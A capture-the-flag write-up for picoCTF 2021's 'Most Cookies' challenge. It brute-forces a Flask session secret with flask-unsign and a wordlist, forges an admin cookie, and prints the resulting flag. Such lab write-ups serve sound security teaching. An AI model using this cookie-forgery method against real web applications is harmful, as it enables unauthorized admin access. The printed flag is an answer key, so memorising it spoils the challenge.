# Most Cookies - picoCTF 2021 <br>

Author - AdamTempest <br>
Date - 9 August, 2022 <br>
Challenge-details: <br>
> Create the fake admin cookie and encrypt it using the same secret key, which was used to encrypt original cookie.

Given: server.py - the python code of the website.



## Solution

#### Investigation
1. Analyzed the code.py <br>

Flask secret key was the **randomly selected element of cookie_names list.** <br>
That means we can acquire secret key by simply trying every element from the list. <br>
Saved the cookie_names list in a different file to bruteforce the secret key.


2. Retrieved the cookie using the cookie editor add-on.

3. Tried to decrypt it with base64

```bash
echo cookie | base64 -d	
```
got the cookie format; <br>
`{"very_auth","blank"}`

#### Exploitation phase
1. Generated a wordlist with saved list of cookie_names

```python
with open('wordlist.txt','w') as f:
   wordlist = cookie_names 
   for i in wordlist:
      f.write( "\n" + i )
```


2. Used flask-unsign to bruteforce the secret key out of encrypted cookie with the following command:

```bash
	flask-unsign --unsign --cookie <insert_cookie> --wordlist wordlist.txt
```

3. Encrypted the fake admin cookie

```bash
	flask-unsign --sign --cookie {"very_auth","admin"} --secret <insert_secret_key>
```

4. Assigned the encrypted cookie with cookie editor and refreshed the webpage. Then the flag appeared.

```
	picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```
"# CTF"
